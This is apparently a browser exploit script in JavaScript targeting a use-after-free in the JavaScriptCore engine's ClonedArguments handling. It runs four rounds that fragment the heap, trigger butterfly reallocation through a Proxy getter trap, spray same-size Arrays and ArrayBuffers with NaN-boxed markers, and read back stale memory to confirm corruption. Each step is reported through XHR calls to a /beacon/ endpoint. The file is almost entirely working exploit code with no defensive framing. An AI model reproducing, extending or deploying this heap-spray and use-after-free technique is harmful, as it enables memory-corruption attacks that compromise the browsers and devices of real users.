// p220b — ClonedArguments butterfly UAF (improved spray)
//
// Improvements over p220:
// 1. Hole at HIGH index (since copyToArguments iterates REVERSE,
//    trap fires early → maximum stale-pointer reads at lower indices)
// 2. Array spray instead of ArrayBuffer (same allocator as butterfly)
// 3. Heap fragmentation before trigger to prevent realloc-in-place
// 4. Multiple rounds with increasing spray counts
//
// Beacon prefix: V220B-

(function() {
  function B(tag, body) {
    var url = '/beacon/V220B-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // --- Round 1: 16 args, hole at index 14 (near top) ---
  // copyToArguments goes 15, 14(HOLE→trap), 13, 12, ..., 0 (all stale)
  // Old butterfly: 16 * 8 + 8(header) = 136 bytes
  function round1() {
    B('R1-START');
    var NARGS = 16;
    var HOLE_IDX = 14;

    // Pre-fragment the heap: allocate and free many butterfly-sized objects
    // to prevent realloc from growing in place
    var fragObjs = [];
    for (var f = 0; f < 500; f++) {
      var a = new Array(NARGS);
      for (var k = 0; k < NARGS; k++) a[k] = k + 0xF000;
      fragObjs.push(a);
    }
    // Now free half of them to create holes in the heap
    for (var f = 0; f < 500; f += 2) {
      fragObjs[f] = null;
    }
    B('R1-FRAG-DONE');

    var reallocCount = 0;
    var sprayArrays = [];

    var args = target(
      0xAA00, 0xAA01, 0xAA02, 0xAA03,
      0xAA04, 0xAA05, 0xAA06, 0xAA07,
      0xAA08, 0xAA09, 0xAA0A, 0xAA0B,
      0xAA0C, 0xAA0D, 0xAA0E, 0xAA0F
    );
    delete args[HOLE_IDX];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R1-TRAP-' + prop);

        // Force butterfly reallocation by growing to much larger size
        // This should allocate a new butterfly and free the old one
        for (var j = NARGS; j < 2000; j++) {
          args[j] = 0xCCCCCCCC;
        }
        B('R1-GREW');

        // Flush bmalloc dealloc log — allocate and free many small objects
        var flush = [];
        for (var f = 0; f < 300; f++) flush.push({a:1,b:2,c:3,d:4,e:5,f:6,g:7,h:8});
        flush = null;

        // Spray with Arrays that have the SAME butterfly size as the old one
        // Old butterfly: 16 elements × 8 bytes + 8 byte header = 136 bytes
        // Array with 16 contiguous elements = same size class
        for (var s = 0; s < 5000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) {
            arr[k] = 0xCAFE0000 | (s & 0xFFFF);
          }
          sprayArrays.push(arr);
        }
        B('R1-SPRAY-' + sprayArrays.length);

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R1-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R1-NULL'); return; }
    B('R1-LEN-' + result.length);

    // Indices 0-13 should be read from stale pointer (after trap at 14)
    // If spray landed, we'd see 0xCAFE#### instead of 0xAA0X
    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xAA00 + i;
      var tag = hex(u);

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u); // hole index, expect BEEF or DEAD
      } else if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        tag = '!' + hex(u);
      } else if (typeof v !== 'number') {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R1-VALS', vals.join(' '));
    B('R1-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R1-CONFIRMED');
  }

  // --- Round 2: 32 args, hole at index 30 ---
  // Old butterfly: 32 * 8 + 8 = 264 bytes
  function round2() {
    B('R2-START');
    var NARGS = 32;
    var HOLE_IDX = 30;

    var reallocCount = 0;
    var sprayArrays = [];

    // Build arguments dynamically
    var argVals = [];
    for (var i = 0; i < NARGS; i++) argVals.push(0xBB00 + i);
    var args = target.apply(null, argVals);
    delete args[HOLE_IDX];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R2-TRAP-' + prop);

        // Grow to force reallocation
        for (var j = NARGS; j < 4000; j++) args[j] = 0xDD;
        B('R2-GREW');

        // Flush
        var flush = [];
        for (var f = 0; f < 500; f++) flush.push(new Array(4));
        flush = null;

        // Spray with matching-size arrays (32 elements)
        for (var s = 0; s < 5000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) arr[k] = 0xD0AD0000 | (s & 0xFFFF);
          sprayArrays.push(arr);
        }
        B('R2-SPRAY-' + sprayArrays.length);

        return 0xBEEF0002;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R2-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R2-NULL'); return; }
    B('R2-LEN-' + result.length);

    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xBB00 + i;
      var tag = hex(u);

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u);
      } else if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        tag = '!' + hex(u);
      } else if (typeof v !== 'number') {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R2-VALS', vals.join(' '));
    B('R2-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R2-CONFIRMED');
  }

  // --- Round 3: Different approach — defineProperty to force dictionary mode ---
  // Converting to dictionary mode frees the contiguous butterfly
  function round3() {
    B('R3-START');
    var NARGS = 16;
    var HOLE_IDX = 14;

    var reallocCount = 0;
    var sprayArrays = [];

    var args = target(
      0xCC00, 0xCC01, 0xCC02, 0xCC03,
      0xCC04, 0xCC05, 0xCC06, 0xCC07,
      0xCC08, 0xCC09, 0xCC0A, 0xCC0B,
      0xCC0C, 0xCC0D, 0xCC0E, 0xCC0F
    );
    delete args[HOLE_IDX];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R3-TRAP-' + prop);

        // Force structure transition by adding named properties
        // This changes the butterfly layout: old contiguous butterfly freed,
        // new butterfly has named property storage + contiguous storage
        args.namedProp1 = 'force';
        args.namedProp2 = 'transition';
        args.namedProp3 = 'of';
        args.namedProp4 = 'butterfly';
        args.namedProp5 = 'layout';
        args.namedProp6 = 'now';
        args.namedProp7 = 'more';
        args.namedProp8 = 'props';
        B('R3-NAMED-ADDED');

        // Also grow indexed storage to force a completely new butterfly
        for (var j = NARGS; j < 500; j++) args[j] = 0xEE;

        // Flush
        var flush = [];
        for (var f = 0; f < 500; f++) flush.push({x:1,y:2,z:3});
        flush = null;

        // Spray with exact-match arrays
        for (var s = 0; s < 5000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) arr[k] = 0xFACE0000 | (s & 0xFFFF);
          sprayArrays.push(arr);
        }
        B('R3-SPRAY-' + sprayArrays.length);

        return 0xBEEF0003;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R3-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R3-NULL'); return; }
    B('R3-LEN-' + result.length);

    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xCC00 + i;
      var tag = hex(u);

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u);
      } else if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        tag = '!' + hex(u);
      } else if (typeof v !== 'number') {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R3-VALS', vals.join(' '));
    B('R3-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R3-CONFIRMED');
  }

  // --- Round 4: Use typed array views over the same buffer as spray ---
  // Spray with ArrayBuffers whose backing store is the exact size of the butterfly
  function round4() {
    B('R4-START');
    var NARGS = 16;
    var HOLE_IDX = 14;
    // butterfly size = IndexingHeader(8) + NARGS*8 = 136 bytes
    var BUTTERFLY_SIZE = 136;

    var reallocCount = 0;
    var sprayBufs = [];

    var args = target(
      0xDD00, 0xDD01, 0xDD02, 0xDD03,
      0xDD04, 0xDD05, 0xDD06, 0xDD07,
      0xDD08, 0xDD09, 0xDD0A, 0xDD0B,
      0xDD0C, 0xDD0D, 0xDD0E, 0xDD0F
    );
    delete args[HOLE_IDX];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R4-TRAP-' + prop);

        // Grow butterfly massively to force non-in-place realloc
        for (var j = NARGS; j < 8000; j++) args[j] = 0xFF;
        B('R4-GREW-8K');

        // Heavy flush: force bmalloc to process deallocation log
        // Allocate+free multiple rounds of objects
        for (var round = 0; round < 3; round++) {
          var junk = [];
          for (var f = 0; f < 200; f++) junk.push(new ArrayBuffer(BUTTERFLY_SIZE));
          for (var f = 0; f < 200; f++) junk[f] = null;
        }

        // Spray with EXACT butterfly size
        for (var s = 0; s < 8000; s++) {
          var ab = new ArrayBuffer(BUTTERFLY_SIZE);
          var view = new Float64Array(ab);
          // Write as float64 to match JSValue encoding
          // Each JSValue slot is 8 bytes (float64)
          // We write a NaN-boxed int32: high 32 bits = 0xFFFE0000, low 32 = marker
          var dv = new DataView(ab);
          for (var k = 0; k < NARGS + 1; k++) {
            if (k * 8 + 7 < BUTTERFLY_SIZE) {
              dv.setUint32(k * 8, 0xCAFE0000 | (s & 0xFFFF), true);   // low 32
              dv.setUint32(k * 8 + 4, 0xFFFE0000, true);              // high 32
            }
          }
          sprayBufs.push(ab);
        }
        B('R4-SPRAY-' + sprayBufs.length);

        return 0xBEEF0004;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R4-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R4-NULL'); return; }
    B('R4-LEN-' + result.length);

    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xDD00 + i;
      var tag = hex(u);

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u);
      } else if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        tag = '!' + hex(u);
      } else if (typeof v !== 'number') {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R4-VALS', vals.join(' '));
    B('R4-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R4-CONFIRMED');

    // If any spray buf now contains unexpected data, the UAF went bidirectional
    var bidir = 0;
    for (var s = 0; s < Math.min(sprayBufs.length, 100); s++) {
      var dv2 = new DataView(sprayBufs[s]);
      var lo = dv2.getUint32(0, true);
      var hi = dv2.getUint32(4, true);
      if (hi !== 0xFFFE0000 || (lo >>> 16) !== 0xCAFE) {
        bidir++;
        if (bidir <= 3) B('R4-BIDIR-' + s + '-' + hex(lo) + '_' + hex(hi));
      }
    }
    if (bidir > 0) B('R4-BIDIR-TOTAL-' + bidir);
  }

  try { round1(); } catch(e) { B('R1-FATAL-' + e.message.substring(0, 40)); }
  try { round2(); } catch(e) { B('R2-FATAL-' + e.message.substring(0, 40)); }
  try { round3(); } catch(e) { B('R3-FATAL-' + e.message.substring(0, 40)); }
  try { round4(); } catch(e) { B('R4-FATAL-' + e.message.substring(0, 40)); }

  B('ALL-DONE');
})();
